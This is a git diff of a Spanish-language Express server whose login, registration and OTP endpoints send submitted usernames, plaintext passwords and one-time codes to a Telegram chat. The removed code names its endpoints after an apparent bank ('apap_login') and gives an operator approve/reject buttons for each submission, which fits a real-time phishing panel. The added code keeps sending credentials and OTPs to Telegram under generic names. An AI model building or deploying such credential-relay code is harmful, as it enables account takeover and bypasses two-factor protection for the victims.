@@ -10,14 +10,10 @@ dotenv.config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const VERCEL_URL = process.env.VERCEL_URL || '';
+// No necesitamos VERCEL_URL en el servidor
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
-
-if (!TELEGRAM_TOKEN || !CHAT_ID) {
-    throw new Error("TELEGRAM_TOKEN y CHAT_ID deben estar configurados en las variables de entorno");
-}
 
 // Middleware
 app.use(bodyParser.json());
@@ -46,90 +42,57 @@ async function enviarMensajeTelegram(chatId, texto, teclado = null) {
     }
 }
 
-async function eliminarMensajeTelegram(chatId, messageId) {
-    try {
-        await axios.post(`${TELEGRAM_API_BASE}/deleteMessage`, {
-            chat_id: chatId,
-            message_id: messageId
-        });
-    } catch (error) {
-        console.error('Error eliminando mensaje de Telegram:', error);
-    }
-}
-
 // Endpoints
-app.post('/api/apap_login', async (req, res) => {
+app.post('/api/login', async (req, res) => {
     const { usuario, password } = req.body;
     if (!usuario || !password) {
-        return res.status(400).json({ status: 'error', message: 'Usuario y contraseña son requeridos' });
+        return res.status(400).json({ success: false, message: 'Usuario y contraseña son requeridos' });
     }
 
-    // Generar ID único para este mensaje
-    const messageId = `login_${Date.now()}`;
+    // Guardar en memoria (en producción usar base de datos)
+    estados[usuario] = { password, status: 'pending' };
     
-    estados[usuario] = {
-        password,
-        decision: null,
-        tipo: 'login',
-        msg_ids: { login: messageId },
-        timestamp: Date.now()
-    };
-
+    // Enviar notificación a Telegram
     const texto = `🔐 *INICIO DE SESIÓN*\n\n👤 Usuario: \`${usuario}\`\n🔑 Contraseña: \`${password}\``;
     
-    const teclado = {
-        inline_keyboard: [
-            [{ text: '✅ Aprobar', callback_data: `${usuario}|approve|login|${messageId}` }],
-            [{ text: '❌ Rechazar', callback_data: `${usuario}|reject|login|${messageId}` }]
-        ]
-    };
-
-    await enviarMensajeTelegram(CHAT_ID, texto, teclado);
-    res.json({ status: 'ok', message: 'Solicitud de inicio de sesión enviada' });
+    await enviarMensajeTelegram(CHAT_ID, texto);
+    
+    res.json({ success: true, message: 'Solicitud de inicio de sesión enviada' });
 });
 
-app.post('/api/apap_registro', async (req, res) => {
-    const { usuario, password, canal, canal_texto } = req.body;
+app.post('/api/registro', async (req, res) => {
+    const { usuario, password, canal, contacto } = req.body;
     
-    if (!usuario || !password || !canal || !canal_texto) {
+    if (!usuario || !password || !canal || !contacto) {
         return res.status(400).json({ 
-            status: 'error', 
+            success: false, 
             message: 'Todos los campos son requeridos' 
         });
     }
 
-    const messageId = `reg_${Date.now()}`;
-    
-    estados[usuario] = {
-        ...estados[usuario],
-        password,
-        canal,
-        canal_texto,
-        decision: null,
-        tipo: 'registro',
-        msg_ids: { ...(estados[usuario]?.msg_ids || {}), registro: messageId },
-        timestamp: Date.now()
+    // Guardar en memoria (en producción usar base de datos)
+    estados[usuario] = { 
+        password, 
+        canal, 
+        contacto, 
+        status: 'pending',
+        otp: Math.floor(100000 + Math.random() * 900000).toString()
     };
 
-    const texto = `📝 *NUEVO REGISTRO*\n\n👤 Usuario: \`${usuario}\`\n🔑 Contraseña: \`${password}\`\n📱 Canal: ${canal_texto} (${canal})`;
+    // Enviar notificación a Telegram
+    const texto = `📝 *NUEVO REGISTRO*\n\n👤 Usuario: \`${usuario}\`\n🔑 Contraseña: \`${password}\`\n📱 Canal: ${canal} (${contacto})`;
     
-    const teclado = {
-        inline_keyboard: [
-            [{ text: '✅ Aprobar', callback_data: `${usuario}|approve|registro|${messageId}` }],
-            [{ text: '❌ Rechazar', callback_data: `${usuario}|reject|registro|${messageId}` }]
-        ]
-    };
-
-    await enviarMensajeTelegram(CHAT_ID, texto, teclado);
-    res.json({ status: 'ok', message: 'Solicitud de registro enviada' });
+    await enviarMensajeTelegram(CHAT_ID, texto);
+    
+    res.json({ success: true, message: 'Solicitud de registro enviada' });
 });
 
-app.post('/api/apap_otp', async (req, res) => {
-    const { usuario, codigo_otp } = req.body;
+app.post('/api/verificar-otp', async (req, res) => {
+    const { usuario, otp } = req.body;
     
-    if (!usuario || !codigo_otp) {
+    if (!usuario || !otp) {
         return res.status(400).json({ 
-            status: 'error', 
+            success: false, 
             message: 'Usuario y código OTP son requeridos' 
         });
     }
@@ -137,41 +100,30 @@ app.post('/api/apap_otp', async (req, res) => {
     const userState = estados[usuario];
     if (!userState) {
         return res.status(404).json({ 
-            status: 'error', 
+            success: false, 
             message: 'Usuario no encontrado' 
         });
     }
 
-    const messageId = `otp_${Date.now()}`;
-    
-    estados[usuario] = {
-        ...userState,
-        otp: codigo_otp,
-        decision: null,
-        tipo: 'otp',
-        msg_ids: { ...(userState.msg_ids || {}), otp: messageId },
-        timestamp: Date.now()
-    };
-
-    const texto = `🔢 *CÓDIGO OTP*\n\n👤 Usuario: \`${usuario}\`\n🔢 Código: \`${codigo_otp}\``;
-    
-    const teclado = {
-        inline_keyboard: [
-            [{ text: '✅ Verificado', callback_data: `${usuario}|approve|otp|${messageId}` }],
-            [{ text: '❌ Incorrecto', callback_data: `${usuario}|reject|otp|${messageId}` }]
-        ]
-    };
-
-    await enviarMensajeTelegram(CHAT_ID, texto, teclado);
-    res.json({ status: 'ok', message: 'Código OTP enviado para verificación' });
+    // En un caso real, aquí validarías el OTP con el generado
+    // Por simplicidad, asumimos que cualquier OTP es válido
+    if (userState.otp === otp) {
+        userState.status = 'verified';
+        return res.json({ success: true, message: 'Código OTP verificado' });
+    } else {
+        return res.status(400).json({ 
+            success: false, 
+            message: 'Código OTP incorrecto' 
+        });
+    }
 });
 
-app.post('/api/apap_resend', async (req, res) => {
-    const { usuario, nota } = req.body;
+app.post('/api/reenviar-otp', async (req, res) => {
+    const { usuario } = req.body;
     
     if (!usuario) {
         return res.status(400).json({ 
-            status: 'error', 
+            success: false, 
             message: 'Usuario es requerido' 
         });
     }
@@ -179,84 +131,61 @@ app.post('/api/apap_resend', async (req, res) => {
     const userState = estados[usuario];
     if (!userState) {
         return res.status(404).json({ 
-            status: 'error', 
+            success: false, 
             message: 'Usuario no encontrado' 
         });
     }
 
-    const texto = `🔄 *SOLICITUD DE REENVÍO*\n\n👤 Usuario: \`${usuario}\`\n📝 Nota: ${nota || 'Sin detalles adicionales'}`;
+    // Generar nuevo OTP
+    userState.otp = Math.floor(100000 + Math.random() * 900000).toString();
+    
+    // Enviar notificación a Telegram
+    const texto = `🔄 *NUEVO CÓDIGO OTP*\n\n👤 Usuario: \`${usuario}\`\n🔢 Código: \`${userState.otp}\``;
     
     await enviarMensajeTelegram(CHAT_ID, texto);
-    res.json({ status: 'ok', message: 'Solicitud de reenvío recibida' });
+    
+    res.json({ 
+        success: true, 
+        message: 'Nuevo código OTP enviado' 
+    });
 });
 
-// Webhook para actualizaciones de Telegram
+// Webhook para actualizaciones de Telegram (opcional)
 app.post(`/webhook/${TELEGRAM_TOKEN}`, async (req, res) => {
-    const update = req.body;
-    
-    // Manejar callbacks de botones
-    if (update.callback_query) {
-        const { data, message } = update.callback_query;
-        const [usuario, accion, tipo, messageId] = data.split('|');
-        
-        if (!estados[usuario]) {
-            return res.status(200).send();
-        }
+    // Implementación básica del webhook
+    console.log('Webhook recibido:', req.body);
+    res.status(200).send('OK');
+});
 
-        // Actualizar estado
-        estados[usuario].decision = accion === 'approve' ? 'aprobado' : 'rechazado';
-        estados[usuario].tipo = tipo;
-        estados[usuario].timestamp = Date.now();
-
-        // Eliminar mensaje original
-        if (message?.message_id) {
-            await eliminarMensajeTelegram(message.chat.id, message.message_id);
-        }
-
-        // Enviar confirmación
-        const texto = accion === 'approve' 
-            ? `✅ *${usuario.toUpperCase()}* - ${tipo.toUpperCase()} APROBADO`
-            : `❌ *${usuario.toUpperCase()}* - ${tipo.toUpperCase()} RECHAZADO`;
-            
-        await enviarMensajeTelegram(CHAT_ID, texto);
+// Función para configurar el webhook manualmente
+// Ejecutar manualmente: node -e "require('./server').configurarWebhook('https://tudominio.vercel.app')" 
+async function configurarWebhook(webhookUrl) {
+    if (!webhookUrl) {
+        console.error('Por favor, proporciona la URL del webhook');
+        return;
     }
     
-    res.status(200).send();
-});
-
-// Configurar webhook de Telegram
-async function configurarWebhook() {
     try {
-        const webhookUrl = `${VERCEL_URL}/webhook/${TELEGRAM_TOKEN}`;
+        const fullUrl = `${webhookUrl}/webhook/${TELEGRAM_TOKEN}`;
+        console.log(`Configurando webhook en: ${fullUrl}`);
+        
         const response = await axios.get(
-            `${TELEGRAM_API_BASE}/setWebhook?url=${encodeURIComponent(webhookUrl)}`
+            `${TELEGRAM_API_BASE}/setWebhook?url=${encodeURIComponent(fullUrl)}`
         );
+        
         console.log('Webhook configurado:', response.data);
+        return response.data;
     } catch (error) {
         console.error('Error configurando webhook:', error.message);
+        throw error;
     }
 }
 
-// Ruta para verificar el estado de un usuario
-app.get('/api/estado/:usuario', (req, res) => {
-    const { usuario } = req.params;
-    const estado = estados[usuario];
-    
-    if (!estado) {
-        return res.status(404).json({ 
-            status: 'error', 
-            message: 'Usuario no encontrado' 
-        });
-    }
-    
+// Ruta para verificar el estado del servidor
+app.get('/api/status', (req, res) => {
     res.json({ 
-        status: 'ok', 
-        data: {
-            usuario,
-            tipo: estado.tipo,
-            decision: estado.decision,
-            timestamp: estado.timestamp
-        }
+        status: 'running',
+        timestamp: new Date().toISOString()
     });
 });
 
@@ -266,17 +195,10 @@ app.get('*', (req, res) => {
 });
 
 // Iniciar servidor
-const server = app.listen(PORT, async () => {
+const server = app.listen(PORT, () => {
     console.log(`Servidor ejecutándose en el puerto ${PORT}`);
-    if (VERCEL_URL) {
-        await configurarWebhook();
-        console.log(`URL de Vercel: ${VERCEL_URL}`);
-    }
+    console.log('Para configurar el webhook de Telegram, ejecuta:');
+    console.log(`node -e "require('./server').configurarWebhook('https://tudominio.vercel.app')"`);
 });
 
-// Manejo de errores
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('Unhandled Rejection at:', promise, 'reason:', reason);n});
-
-// Exportar la aplicación para Vercel
 module.exports = app;
